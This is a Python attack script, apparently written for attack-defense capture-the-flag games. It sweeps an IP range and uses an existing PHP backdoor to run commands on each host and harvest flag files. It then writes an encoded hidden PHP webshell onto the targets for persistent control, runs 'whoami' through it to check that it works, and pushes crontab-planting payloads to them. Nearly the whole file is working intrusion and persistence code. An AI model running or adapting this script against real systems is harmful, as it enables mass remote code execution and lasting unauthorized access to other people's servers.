#coding:utf-8
import requests
import base64
def drop_database():
    pass
def back_door(ip_start,ip_end,shell_addr,shell_pass,payload,method):#后门利用
    #?c=echo%20file_get_contents("http://172.16.0.255/flag")
    url = ".".join(ip_start.split(".")[0:3])
    ip_start = int(ip_start.split(".")[-1])
    ip_end = int(ip_end.split(".")[-1])
    shell = shell_addr  #后门地址
    passwd = shell_pass      #后门密码
    payload = {passwd:payload}
    #payload = {passwd: 'curl http://172.16.0.255/flag'}
    #payload1 = {passwd:"echo file_get_contents(\"http://172.16.0.225:8000/flag\");"}
    file = open("flag.txt","w")
    for i in range(ip_start,ip_end): #存活ip列表
        #if i == 177:
        #    continue
        url1 = "http://"+url + "."+str(i)  + shell
        try:
            if(method=="get"):
                res = requests.get(url1,params=payload,timeout=1)
            if(method=="post"):
                res = requests.post(url1,data=payload,timeout=1)
            #print(res.text)
            if  "flag" in res.text:
                #print url1 + " connect shell sucess,flag is " + res.text
                ip = url +"."+ str(i)
                flag = res.text
                #flag = re.findall("/(flag{.*})/",flag)
                print(ip+"----"+flag)
                file.write(ip+"----"+flag)
                file.write("\n")
            else:
                print(ip+"----"+"shell 404")
                pass
        except:
            print(url1 + " connect shell fail 404  ")
            pass
#back_door("192.168.111.130","192.168.111.135","/back.php","c","echo file_get_contents(\"../../../../../flag\");","post")
def make_sudo(ip_start,ip_end,shell_addr,shell_pass,method):#通过后门种植不死马，把维持了权限的ip写进txt
    ips=open("keep_continue_ip_list.txt","w")
    filename="c1sec1.php"
    f= open(filename,'r')
    php = f.read()
    print(php)
    php = base64.b64encode(php.encode("ascii"))
    php = php.decode("ascii")
    url = ".".join(ip_start.split(".")[0:3])
    ip_start = int(ip_start.split(".")[-1])
    ip_end = int(ip_end.split(".")[-1])
    shell = shell_addr  
    passwd = shell_pass            
    if(method == "get"):
        data = {passwd:"file_put_contents(\".c1sec2018.php\",base64_decode(\"" + php + "\"));"}
    if(method == "post"):
        data = {passwd:"file_put_contents(\".c1sec2018.php\",base64_decode(\"" + php + "\"));"}
    for i in range(ip_start,ip_end):  # 存活ip列表
        try:
            url1 = "http://"+url + "."+str(i) + shell
            print(url1)
            if(method == "get"):
                attack = requests.get(url=url1,params=data,timeout=1)
            if(method == "post"):
                attack = requests.post(url=url1,data=data,timeout=1)
            if(attack.status_code == 200):
                url1 = "http://"+url + "."+ str(i) +"/.c1sec2018.php" 
                try:
                    requests.get(url=url1,timeout=0.1)
                except:
                    pass 
                url1 = "http://"+url + "."+ str(i) +"/.c1sec2333.php"
                active = requests.post(url=url1,data={"0":"system","1":"whoami"},timeout=1)
                if(len(active.text)>0):
                    print(active.text)
                    ips.write(url+"."+str(i)+"----"+"success")
                    ips.write("\n")
                    print("please visit "+ url+str(i)+"/.c1sec2333.php"+" to get longer control.")
                else:
                    print("sorry the file is not exit!")
        except:
            print(url1+"-----error")
#make_sudo("192.168.111.130","192.168.111.135","/back.php","c","post")


def make_crontab(ip_start,ip_end,shell_addr,shell_pass,method):
    url = ".".join(ip_start.split(".")[0:3])
    ip_start = int(ip_start.split(".")[-1])
    ip_end = int(ip_end.split(".")[-1])
    shell = shell_addr  
    passwd = shell_pass
    filename = "cr.txt"
    f= open(filename,"r")
    php = f.read() 
    if(method == "get"):
        data = {passwd:php}
    if(method == "post"):
        data = {passwd:php}
    #print(data)
    for i in range(ip_start,ip_end):
        try:
            url1 = "http://"+url + "."+str(i) + shell
            #print(url1)
            if(method == "get"):
                attack = requests.get(url=url1,params=data,timeout=1)
            if(method == "post"):
                attack = requests.post(url=url1,data=data,timeout=1)
            #res = requests.post(url="http://"+url + "."+"133" + shell,data=data)
            #print(attack.text)
            if(len(attack.text)>1):
                print(url1+"-----------------make crontab success!")
        except:
            print(url1+"-----error")
make_crontab("127.0.0.1","127.0.0.2","/back.php","c","post")

